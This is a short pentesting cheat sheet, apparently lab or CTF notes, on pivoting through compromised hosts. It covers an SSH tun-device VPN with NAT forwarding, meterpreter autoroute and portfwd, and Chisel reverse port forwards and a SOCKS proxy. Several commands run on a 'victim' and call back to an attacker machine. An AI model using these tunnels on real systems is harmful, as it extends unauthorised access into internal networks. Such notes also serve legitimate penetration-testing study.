## ssh
You need root in both devices (as you are going to create new interfaces) and the sshd config has to allow root login:
PermitRootLogin yes
PermitTunnel yes
```bash
#This will create Tun interfaces in both devices
sudo ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up # client and server side
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
```

Enable forwarding on the Server side
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Set a new route on the client side
```bash
route add -net 10.0.0.0/16 gw 1.1.1.1
```
from https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#vpn-tunnel


## meterpreter
```
run autoroute -s target_address
```
```
portfwd add -l local_port -p remote_port -r remote_victim_2
```


## Chisel

* kali(10.10.14.3): `chisel server -p 8000 --reverse`

### port forward command on the victim side
```shell
# kali to victim
./chisel client 10.10.14.3:8000 R:3333:127.0.0.1:3456
# Listen on Kali 3333, forward to localhost port 3456 on client

# victim to kali
./chisel client 10.10.14.55:8000 1234:127.0.0.1:80
# listen @victim on 1234 forward to kali@127.0.0.1 80
```
### socks proxy
*victim: `chisel client 10.10.14.3:8000 R:9050:socks`<br>
Create SOCKS5 listener on 9050 on Kali, proxy through client

